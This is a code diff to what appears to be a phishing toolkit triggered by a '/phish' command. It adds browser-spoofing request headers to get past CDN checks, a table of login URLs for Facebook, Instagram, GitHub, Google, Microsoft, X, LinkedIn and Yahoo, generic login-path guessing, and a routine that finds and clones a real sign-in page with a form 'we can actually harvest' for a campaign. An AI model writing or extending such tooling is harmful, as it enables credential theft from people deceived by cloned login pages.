@@ -72,6 +72,73 @@ _UA = (
     "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
 )
 
+# Extra headers a real Chrome navigation sends. Facebook (and a few other
+# CDNs) 400 a request that only has UA/Accept — the Sec-Fetch-* set is what
+# turns that into the live login HTML.
+_FETCH_HEADERS = {
+    "User-Agent": _UA,
+    "Accept": (
+        "text/html,application/xhtml+xml,application/xml;q=0.9,"
+        "image/avif,image/webp,*/*;q=0.8"
+    ),
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "identity",
+    "Upgrade-Insecure-Requests": "1",
+    "Cache-Control": "max-age=0",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+}
+
+# Bare host → the URL that actually serves that site's login form.
+# `/phish www.facebook.com` must clone facebook.com/login, not the marketing
+# homepage and not the generic branded card. A pasted path still wins.
+_LOGIN_PATHS: dict[str, str] = {
+    "facebook.com": "https://www.facebook.com/login/",
+    "www.facebook.com": "https://www.facebook.com/login/",
+    "m.facebook.com": "https://www.facebook.com/login/",
+    "mbasic.facebook.com": "https://www.facebook.com/login/",
+    "fb.com": "https://www.facebook.com/login/",
+    "instagram.com": "https://www.instagram.com/accounts/login/",
+    "www.instagram.com": "https://www.instagram.com/accounts/login/",
+    "github.com": "https://github.com/login",
+    "www.github.com": "https://github.com/login",
+    "linkedin.com": "https://www.linkedin.com/login",
+    "www.linkedin.com": "https://www.linkedin.com/login",
+    "x.com": "https://x.com/i/flow/login",
+    "www.x.com": "https://x.com/i/flow/login",
+    "twitter.com": "https://x.com/i/flow/login",
+    "www.twitter.com": "https://x.com/i/flow/login",
+    "accounts.google.com": "https://accounts.google.com/ServiceLogin",
+    "google.com": "https://accounts.google.com/ServiceLogin",
+    "www.google.com": "https://accounts.google.com/ServiceLogin",
+    "login.microsoftonline.com": "https://login.microsoftonline.com/",
+    "microsoft.com": "https://login.microsoftonline.com/",
+    "www.microsoft.com": "https://login.microsoftonline.com/",
+    "office.com": "https://login.microsoftonline.com/",
+    "www.office.com": "https://login.microsoftonline.com/",
+    "yahoo.com": "https://login.yahoo.com/",
+    "www.yahoo.com": "https://login.yahoo.com/",
+    "login.yahoo.com": "https://login.yahoo.com/",
+}
+
+# Generic paths to try, in order, when the host is not in the table above
+# and the operator did not paste a path themselves.
+_GENERIC_LOGIN_PATHS = (
+    "/login",
+    "/login/",
+    "/signin",
+    "/sign-in",
+    "/account/login",
+    "/accounts/login",
+    "/accounts/login/",
+    "/user/login",
+    "/users/sign_in",
+    "/auth/login",
+    "/session/new",
+)
+
 # How long we wait for a tunnel binary to print a public URL.
 _TUNNEL_WAIT = 12.0
 
@@ -96,8 +163,10 @@ def normalise_target(raw: str) -> str:
 def target_url(raw: str) -> str:
     """The URL we actually fetch.
 
-    A pasted path is kept (``site.com/login`` clones the login page, not the
-    homepage). A missing scheme becomes https.
+    A pasted path is kept (``site.com/login`` clones that page, not the
+    homepage). A bare host is rewritten to that site's known login URL
+    so ``/phish www.facebook.com`` clones the Facebook login form, not
+    the marketing homepage. A missing scheme becomes https.
     """
     text = (raw or "").strip()
     if not text:
@@ -107,9 +176,70 @@ def target_url(raw: str) -> str:
     parsed = urllib.parse.urlparse(text)
     if not parsed.netloc:
         return ""
+    host = (parsed.hostname or "").strip(".").lower()
+    path = parsed.path or ""
+    # Only a host (or `/`) — pick the real login page for that brand.
+    if host in _LOGIN_PATHS and path in ("", "/"):
+        return _LOGIN_PATHS[host]
     # Drop fragments; keep query — some login pages key off it.
     rebuilt = parsed._replace(fragment="")
     return urllib.parse.urlunparse(rebuilt)
+
+
+def login_candidates(raw: str) -> list[str]:
+    """URLs to try, in order, until one actually looks like a login page.
+
+    The first entry is always ``target_url`` so a pasted path still wins.
+    Extra well-known paths are appended so a bare ``/phish shop.example``
+    still lands on ``/login`` rather than a homepage with no form.
+    """
+    primary = target_url(raw)
+    if not primary:
+        return []
+    parsed = urllib.parse.urlparse(primary)
+    host = (parsed.hostname or "").strip(".").lower()
+    path = parsed.path or "/"
+    out: list[str] = [primary]
+    # A pasted path is authoritative — do not spray extra guesses.
+    if path not in ("", "/"):
+        return out
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    for suffix in _GENERIC_LOGIN_PATHS:
+        guess = origin + suffix
+        if guess not in out:
+            out.append(guess)
+    # Last resort: the bare origin, in case the homepage IS the login.
+    if origin + "/" not in out and origin not in out:
+        out.append(origin + "/")
+    # Known-host mapping already put the right URL first; keep the rest
+    # as fallbacks in case that host moved.
+    if host in _LOGIN_PATHS and _LOGIN_PATHS[host] not in out:
+        out.insert(0, _LOGIN_PATHS[host])
+    return out
+
+
+def looks_like_login(html_text: str) -> bool:
+    """True when the page has a form we can actually harvest.
+
+    A marketing homepage with no password field is not a login page, even
+    if the fetch succeeded. Used to decide whether to try the next
+    candidate or fall back to the branded template.
+    """
+    if not html_text:
+        return False
+    lowered = html_text.lower()
+    if "<form" not in lowered:
+        return False
+    if re.search(r'type\s*=\s*["\']password["\']', lowered):
+        return True
+    # Some logins (email-first, OTP) have a form but no password input
+    # in the first paint. A form plus a login-ish title/action still
+    # counts — better than the generic card.
+    if re.search(r"<form\b[^>]*>", lowered) and re.search(
+        r"(sign\s*in|log\s*in|password|passcode|email|username)", lowered
+    ):
+        return True
+    return False
 
 
 def validate_target(raw: str) -> tuple[bool, str]:
@@ -292,15 +422,7 @@ def fetch_page(url: str, timeout: float = 12.0) -> tuple[str | None, str]:
     A failure is not fatal — the caller falls back to the branded template
     and the note is what zim-pane shows as the clone status.
     """
-    req = urllib.request.Request(
-        url,
-        headers={
-            "User-Agent": _UA,
-            "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-        },
-        method="GET",
-    )
+    req = urllib.request.Request(url, headers=dict(_FETCH_HEADERS), method="GET")
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             raw = resp.read()
@@ -324,6 +446,31 @@ def fetch_page(url: str, timeout: float = 12.0) -> tuple[str | None, str]:
         return None, f"fetch failed: {reason}"
     except Exception as e:  # noqa: BLE001
         return None, f"fetch failed: {type(e).__name__}: {e}"
+
+
+def clone_login(raw: str, timeout: float = 12.0) -> tuple[str | None, str, str]:
+    """Walk login candidates until one looks like the real sign-in page.
+
+    Returns ``(html_or_none, note, url_used)``. The template is only used
+    when every candidate failed or none of them had a form — never as a
+    silent stand-in for a successful homepage fetch.
+    """
+    tried: list[str] = []
+    last_note = "no candidates"
+    last_url = target_url(raw)
+    for url in login_candidates(raw):
+        html_text, note = fetch_page(url, timeout=timeout)
+        last_note = note
+        last_url = url
+        if not html_text:
+            tried.append(f"{url} ({note})")
+            continue
+        if looks_like_login(html_text):
+            return html_text, note, url
+        tried.append(f"{url} (no login form)")
+    if tried:
+        last_note = "no login form on: " + "; ".join(tried[:4])
+    return None, last_note, last_url
 
 
 def build_page(host: str, url: str, fetched: str | None) -> tuple[str, bool]:
@@ -602,7 +749,9 @@ class Campaign:
         self.alive = False
 
         if fetch:
-            fetched, note = fetch_page(self.url)
+            fetched, note, used = clone_login(target)
+            if used:
+                self.url = used
             self.clone_note = note
             self.page_html, self.cloned = build_page(self.host, self.url, fetched)
         else:
